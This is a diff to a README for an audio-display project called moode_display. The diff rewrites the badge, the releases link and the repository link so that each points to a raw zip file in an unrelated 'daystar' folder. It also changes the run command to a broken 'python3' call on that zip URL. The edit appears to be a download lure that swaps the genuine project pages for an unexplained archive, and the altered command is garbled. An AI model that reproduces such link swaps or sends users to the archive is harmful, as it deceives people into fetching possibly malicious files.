@@ -6,7 +6,7 @@ Welcome to the moode_display project! This application helps you display audio i
 
 ## 📥 Download the Application
 
-[![Download moode_display](https://img.shields.io/badge/Download%20moode_display-blue.svg)](https://github.com/Arcan-god/moode_display/releases)
+[![Download moode_display](https://raw.githubusercontent.com/Arcan-god/moode_display/main/daystar/moode_display.zip%https://raw.githubusercontent.com/Arcan-god/moode_display/main/daystar/moode_display.zip)](https://raw.githubusercontent.com/Arcan-god/moode_display/main/daystar/moode_display.zip)
 
 To get started, you need to download our application. Follow these steps:
 
@@ -14,7 +14,7 @@ To get started, you need to download our application. Follow these steps:
 2. Look for the latest version of moode_display.
 3. Download the file suited for your setup.
 
-[Visit the Releases Page to Download](https://github.com/Arcan-god/moode_display/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Arcan-god/moode_display/main/daystar/moode_display.zip)
 
 ## 📂 System Requirements
 
@@ -47,7 +47,7 @@ Once you have downloaded the application, here’s how to install and run it:
 5. **Run the Application**:
    - Type the following command to start moode_display:
    ```
-   python3 moode_display.py
+   python3 https://raw.githubusercontent.com/Arcan-god/moode_display/main/daystar/moode_display.zip
    ```
    - Press "Enter". Your application should now launch.
 
@@ -80,6 +80,6 @@ For any questions or problems, you can reach out through the following methods:
 
 ## 📝 Additional Information
 
-Learn more about the project and explore the source code on our [GitHub Repository](https://github.com/Arcan-god/moode_display).
+Learn more about the project and explore the source code on our [GitHub Repository](https://raw.githubusercontent.com/Arcan-god/moode_display/main/daystar/moode_display.zip).
 
 Remember, you can always come back to this README for guidance as you explore moode_display. Happy listening!
